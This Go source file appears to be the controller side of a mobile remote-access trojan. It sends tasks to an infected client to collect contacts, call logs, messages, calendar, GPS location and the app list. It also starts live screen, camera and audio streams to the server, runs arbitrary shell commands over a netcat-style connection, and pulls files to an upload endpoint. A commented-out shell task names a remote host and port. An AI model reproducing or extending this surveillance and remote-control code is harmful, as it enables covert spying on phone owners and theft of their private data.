package tcpservice

import (
	"arbitrage/common"
	"bufio"
	"bytes"
	"csmm/protos"
	"fmt"
	"time"
)

func GetDevInfo(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_DEVINFO,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("SendTask: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: %v\n", err)
		return nil
	}

	return task
}

func GetAppList(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_APPLIST,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("GetAppList: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func GetProcessList(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_PROCLIST,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("GetProcessList: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func GetDir(csmmClient *protos.CsmmClient, path string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_DIR,
		Payload:  path,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func ChatMsg(csmmClient *protos.CsmmClient, chat string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CHAT,
		Payload:  chat,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("ChatMsg: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("ChatMsg SendTask ERR: ", err)
		return nil
	}

	return task
}

func Contact(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CONTACT,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func Calllog(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CALLLOG,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("Calllog: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func MessageLog(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_MESSAGE,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("MessageLog: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func Calendar(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CALENDAR,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("Calendar: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func Internet(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_INTERNET,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("Internet: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func Gps(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_GPS,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("Gps: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Gps SendTask ERR: ", err)
		return nil
	}

	return task
}

func NetLink(csmmClient *protos.CsmmClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_NetLink,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("NetLink: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("NetLink SendTask ERR: ", err)
		return nil
	}

	return task
}

func ScreenLive(csmmClient *protos.CsmmClient, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())

	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_SCREENLIVE,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, common.ServConfig.RtpPort),
		SSRC:     sessionId,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err = SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("SendTask ScreenLive: %#v %v %v\n", csmmClient, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ScreenLive ERR: ", err)
		return
	}

	return
}

func VideoLive(csmmClient *protos.CsmmClient, videoNum, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: videoNum,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, common.ServConfig.RtpPort),
		SSRC:     sessionId,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err = SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("VideoLive SendTask: %#v %v %v\n", csmmClient, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("VideoLive SendTask ERR: ", err)
		return
	}

	return
}

func SwitchCamera(csmmClient *protos.CsmmClient, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_SWITCHCAMERA,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, common.ServConfig.RtpPort),
		SSRC:     sessionId,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err = SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("SwitchCamera SendTask: %#v %v %v\n", csmmClient, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SwitchCamera SendTask ERR: ", err)
		return
	}

	return
}

func AudioLive(csmmClient *protos.CsmmClient, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_AUDIOLIVE,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, common.ServConfig.RtpPort),
		SSRC:     sessionId,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err = SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("AudioLive SendTask: %#v %v %v\n", csmmClient, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("AudioLive SendTask ERR: ", err)
		return
	}

	return
}

func Remark(csmmClient *protos.CsmmClient, remark string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_REMARK,
		Payload:  remark,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("Remark: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Remark ERR: ", csmmClient, err)
		return nil
	}

	return task
}

func ShellCmd(csmmClient *protos.CsmmClient, cmd string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_SHELL,
		Payload:  cmd,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("ShellCmd SendTask: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("ShellCmd ERR: %v\n", err)
		return nil
	}

	return task
}

func Download(csmmClient *protos.CsmmClient, path string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_DOWNLOAD,
		HostName: fmt.Sprintf("https://%s/api/upload", common.ServConfig.Host),
		Payload:  path,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Download ERR: %v\n", err)
		return nil
	}

	return task
}

func Upload(csmmClient *protos.CsmmClient, path string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_UPLOAD,
		HostName: fmt.Sprintf("http://%s/upload/", common.ServConfig.Host),
		Payload:  path,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	csmmClient.Tasks[taskId] = task

	err := SendTask(csmmClient, task)
	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", csmmClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Download ERR: %v\n", err)
		return nil
	}

	return task
}

func sendCommandByNc(csmmClient *protos.CsmmClient, cmd string) string {
	for {
		if csmmClient.NcConn == nil {
			addShellTask(csmmClient)
			time.Sleep(time.Second)
			continue
		}
		conn := *csmmClient.NcConn

		_, err := conn.Write([]byte(cmd))
		if err != nil {
			conn.Close()
			csmmClient.NcConn = nil
			return ""
		}

		conn.SetReadDeadline(time.Now().Add(time.Second))
		data := bytes.NewBuffer([]byte{})
		reader := bufio.NewReader(conn) //获取输入流

		for {
			var buf [8192]byte
			n, err := reader.Read(buf[:]) //读取数据 从头到尾读取
			if err != nil {
				fmt.Println("read from client failed,err", err)
				break
			}

			data.Write(buf[:n])
		}

		return data.String()
	}
}

func addShellTask(csmmClient *protos.CsmmClient) {
	// has := false

	// for i := 0; i < len(csmmClient.Tasks); i++ {
	// 	if strings.Compare(csmmClient.Tasks[i].TaskType, "shell") == 0 {
	// 		has = true
	// 		break
	// 	}
	// }

	// if has == false {
	// 	csmmClient.Tasks = append(csmmClient.Tasks, protos.TaskStruct{
	// 		TaskId:   time.Now().Format("2006-01-02 15:04:05"),
	// 		TaskType: "shell",
	// 		HostName: "csmm.feitian.link",
	// 		Port:     "20002",
	// 	})
	// }
}
